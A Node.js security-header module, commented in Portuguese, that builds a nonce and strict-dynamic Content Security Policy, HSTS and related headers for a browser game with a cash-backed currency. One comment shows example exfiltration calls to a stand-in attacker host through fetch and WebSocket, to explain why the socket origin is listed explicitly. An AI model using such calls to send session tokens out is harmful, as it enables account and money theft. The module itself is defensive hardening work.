/**
 * Os cabeçalhos de segurança de toda resposta HTTP, e a CSP das páginas.
 *
 * ### Por que isto existe, e por que aqui e não no Caddy
 *
 * O token de sessão do jogo vive no `localStorage`. É uma escolha defensável (o socket manda o
 * token no `hello`, e cookie não serve bem para isso), mas ela tem um preço declarado: um XSS
 * não rouba "uma ação", rouba a CONTA — e com ORB lastreada em USDT, conta é dinheiro. O
 * escape de HTML está certo hoje (ver `shared/escapar-html.mjs`), e continua sendo a primeira
 * tranca. Isto é a segunda: mesmo que um `<script>` estranho apareça na página, ele não roda.
 *
 * A CSP mora no Node, e não no Caddyfile, porque ela carrega um NONCE que muda a cada resposta
 * e precisa bater com o HTML daquela mesma resposta. Só quem gera o corpo consegue fazer isso.
 * O resto dos cabeçalhos vem junto pelo mesmo caminho por um motivo prático: assim eles valem
 * em `npm start` na sua máquina exatamente como valem em produção, e não somem no dia em que
 * alguém trocar o proxy da frente.
 *
 * ### Por que nonce + strict-dynamic, e não uma lista de domínios
 *
 * A página carrega Google Tag Manager, Meta Pixel e Turnstile — e o GTM existe justamente para
 * injetar tags que ainda não foram escritas. Uma lista de domínios teria de crescer a cada tag
 * nova, e uma lista que precisa de manutenção é uma lista que um dia fica desatualizada e
 * quebra um anúncio em produção.
 *
 * `'strict-dynamic'` resolve pela raiz: o que a página carrega é decidido por CONFIANÇA, não
 * por endereço. Os `<script>` do nosso HTML levam o nonce; o que ELES injetarem é confiado por
 * consequência (é assim que o GTM carrega o `gtm.js`, e o Pixel o `fbevents.js`). Já um
 * `<script>` que apareça no meio do HTML por injeção não tem nonce nenhum e morre ali.
 *
 * O `https:` e o `'unsafe-inline'` no fim da linha parecem contradizer tudo isso, e não
 * contradizem: navegador que entende nonce IGNORA os dois. Eles são a rampa para versões
 * antigas, que sem isso não carregariam o jogo de jeito nenhum.
 */
import { randomBytes } from 'node:crypto';

/** Um nonce por resposta. 16 bytes: o suficiente para não ser adivinhável dentro da requisição. */
export const nonceNovo = () => randomBytes(16).toString('base64');

/**
 * Os domínios de fora que a página realmente usa hoje.
 *
 * Só entram em `connect-src`, `img-src` e `frame-src` — onde a lista ainda faz falta porque
 * `strict-dynamic` não vale para eles (ele só governa script). Em `script-src` a lista é
 * decorativa: quem manda lá é o nonce.
 */
const GTM = 'https://www.googletagmanager.com';
const FB = 'https://connect.facebook.net https://www.facebook.com';
const GA = 'https://www.google-analytics.com https://analytics.google.com https://region1.google-analytics.com';
const TURNSTILE = 'https://challenges.cloudflare.com';

/**
 * O endereço do socket do jogo, no formato que a CSP entende.
 *
 * ### Por que explícito, e não `ws: wss:`
 *
 * Esses dois eram CURINGAS DE ESQUEMA: liberavam QUALQUER servidor WebSocket do mundo. A linha
 * do `connect-src` existe para que um script injetado não tenha para onde mandar o que roubou —
 * e com o curinga ela cumpria isso só pela metade. `fetch('https://atacante')` batia na trava;
 * `new WebSocket('wss://atacante')` passava e levava o token do `localStorage` junto. Trocar o
 * transporte contornava a política inteira.
 *
 * ### Por que não basta `'self'`
 *
 * Para a CSP, `wss://pokeidle.io` é outra origem que `https://pokeidle.io` — o esquema faz
 * parte da origem. O CSP3 tem uma regra que relaxa isso para `'self'`, mas ela é recente e não
 * cobre `ws://` numa página `http://`, que é exatamente o desenvolvimento em `localhost:8080`.
 * Endereço explícito vale em todo navegador e em todo ambiente, sem depender de versão.
 *
 * ### Por que DUAS fontes de host
 *
 * O cliente abre o socket em `location.host`, então o endereço certo é o `Host` daquela
 * requisição — é literalmente o mesmo valor. Só que ele passa por dois proxies (Cloudflare e
 * Caddy) e um `header_up Host` mal colocado em qualquer um dos dois o trocaria por
 * `127.0.0.1:8080`: a CSP passaria a barrar o socket do jogo INTEIRO, para todo mundo, e a
 * culpa estaria num arquivo que não é este. Por isso a `URL_PUBLICA` (que já é a base dos
 * links de e-mail e do retorno do OAuth) entra junto: para o socket cair, as duas fontes
 * teriam de estar erradas ao mesmo tempo.
 *
 * O `Host` vem do cliente, e por isso passa pelo filtro: um `Host` com `;` escreveria uma
 * diretiva nova dentro da nossa própria política. Sem host reconhecível nenhum sobra só o
 * `'self'` — o jogo não abriria o socket, e essa é a falha certa: fechado demais, nunca
 * aberto demais.
 */
const HOST_CSP_OK = /^[a-z0-9.-]{1,255}(:\d{1,5})?$/i;

export function origensDoSocket(hosts, https) {
  const esquema = https ? 'wss' : 'ws';
  const limpos = new Set();
  for (const h of hosts ?? []) {
    if (h && HOST_CSP_OK.test(h)) limpos.add(`${esquema}://${h}`);
  }
  return [...limpos].join(' ');
}

/**
 * A CSP da página, já com o nonce desta resposta.
 *
 * `upgrade-insecure-requests` só entra quando a requisição chegou por HTTPS: ligá-lo em
 * `http://localhost:8080` faria o navegador tentar `https://localhost` para cada sprite e o
 * jogo não abriria na máquina de ninguém.
 */
export function csp(nonce, { https, hosts }) {
  return [
    // O piso: o que não estiver dito abaixo só pode vir de nós mesmos.
    `default-src 'self'`,
    // Nonce manda; `strict-dynamic` estende a confiança ao que os nossos scripts carregarem;
    // `https:`/`unsafe-inline` são a rampa para navegador velho (o novo ignora os dois).
    `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
    // `unsafe-inline` no ESTILO é uma concessão consciente, e de risco muito menor: o cliente
    // monta `style="..."` em dezenas de lugares para posicionar sprite e barra de HP. CSS
    // injetado desfigura a tela; não lê o `localStorage` nem faz requisição para fora.
    `style-src 'self' 'unsafe-inline'`,
    // `data:` é o retrato de outfit, desenhado em canvas e servido por `toDataURL()`.
    `img-src 'self' data: ${GTM} ${FB}`,
    `font-src 'self'`,
    `media-src 'self'`,
    // Para onde o jogo pode FALAR. É a linha que mais importa depois de `script-src`: mesmo
    // um script que rodasse não teria para onde mandar o que roubou — e isso só vale de
    // verdade desde que o socket passou a ir pelo endereço exato (ver `origensDoSocket`).
    `connect-src 'self' ${origensDoSocket(hosts, https)} ${GTM} ${GA} ${FB} ${TURNSTILE}`
      .replace(/\s{2,}/g, ' '),
    // `'self'` cobre o `<iframe sandbox srcdoc>` da pré-visualização de e-mail no painel;
    // os outros dois são o `<noscript>` do GTM e o widget do Turnstile.
    `frame-src 'self' ${GTM} ${TURNSTILE}`,
    // Nada de `<object>`/`<embed>`: o jogo não usa, e são caminho clássico de execução.
    `object-src 'none'`,
    // Trava o `<base href>`. Sem isto, uma única tag injetada reescreve o destino de TODO
    // caminho relativo da página — inclusive o `app.js`.
    `base-uri 'none'`,
    // Para onde um `<form>` pode postar. O jogo fala por fetch e por socket.
    `form-action 'self'`,
    // Ninguém põe o jogo dentro de um iframe. É a versão moderna do `X-Frame-Options: DENY`,
    // e o que impede clickjacking em cima do botão de SACAR. Se algum dia o jogo for publicado
    // num portal (Poki, CrazyGames), é ESTA linha que precisa listar o domínio de lá.
    `frame-ancestors 'none'`,
    ...(https ? ['upgrade-insecure-requests'] : []),
  ].join('; ');
}

/**
 * A requisição chegou por HTTPS?
 *
 * Atrás do Caddy o socket é HTTP puro, então quem sabe é o `X-Forwarded-Proto` que ele põe.
 * Vale a mesma ressalva do `ip-cliente.mjs`: o cabeçalho é do proxy, e só é confiável porque
 * a origem não é alcançável sem passar por ele. O pior caso de errar aqui é um HSTS a menos.
 */
export const ehHttps = (req) =>
  String(req.headers['x-forwarded-proto'] ?? '').split(',')[0].trim() === 'https'
  || !!req.socket?.encrypted;

/**
 * Os cabeçalhos que vão em TODA resposta — página, JSON, sprite, 404.
 *
 * @param {boolean} https  liga o HSTS. Em HTTP ele seria ignorado pelo navegador de qualquer
 *   forma, mas mandá-lo assim mesmo é anunciar uma política que aquela resposta não sustenta.
 */
export function cabecalhosBase({ https }) {
  const h = {
    // Impede o navegador de "adivinhar" o tipo do arquivo. Sem isto, um `.json` que comece
    // com HTML pode ser interpretado como página — e aí ele executa no NOSSO domínio.
    'x-content-type-options': 'nosniff',
    // O `frame-ancestors` da CSP é quem realmente decide; este fica para o navegador antigo
    // que não lê CSP, e para as respostas que não são página (que não levam CSP).
    'x-frame-options': 'DENY',
    // Não vaza o caminho completo da página no `Referer` ao sair para fora. `strict-origin-
    // when-cross-origin` ainda manda a origem, que é o que os provedores de anúncio usam para
    // atribuição — cortar tudo quebraria a medição de campanha sem ganho de segurança real.
    'referrer-policy': 'strict-origin-when-cross-origin',
    // O jogo não usa nenhuma destas. Negar explicitamente vale porque o pedido de permissão
    // partiria de um script injetado, não do jogo — e um pedido de câmera com a nossa marca
    // em cima é o tipo de coisa que só se descobre depois.
    'permissions-policy': 'geolocation=(), microphone=(), camera=(), payment=(), usb=(), interest-cohort=()',
  };
  if (https) {
    // HSTS: dois anos, subdomínios inclusos (só existe o `www`, e o Caddy o serve com TLS).
    //
    // SEM `preload` de propósito. O preload é uma lista embutida no navegador e sair dela leva
    // MESES — é um compromisso que se assume quando se tem certeza de que nenhum host do
    // domínio jamais precisará de HTTP. Não é uma decisão para tomar de passagem.
    h['strict-transport-security'] = 'max-age=63072000; includeSubDomains';
  }
  return h;
}

/**
 * Põe o nonce em todo `<script>` do HTML.
 *
 * Fazer isto por varredura, e não com um marcador escrito à mão em cada tag, é o que garante
 * que a tag que alguém acrescentar amanhã já nasça coberta. O contrário — um `__NONCE__` para
 * substituir — falha em silêncio: a tag nova simplesmente não roda, e só em produção.
 *
 * O `(?=[\s>])` evita casar `<scriptable`; a busca é só por tag de abertura, então `</script>`
 * não é tocado. `type="application/ld+json"` também leva nonce, o que é inofensivo: bloco de
 * dados não executa, e nenhum navegador se importa com o atributo sobrando.
 */
export const injetarNonce = (html, nonce) =>
  html.replace(/<script(?=[\s>])/gi, `<script nonce="${nonce}"`);
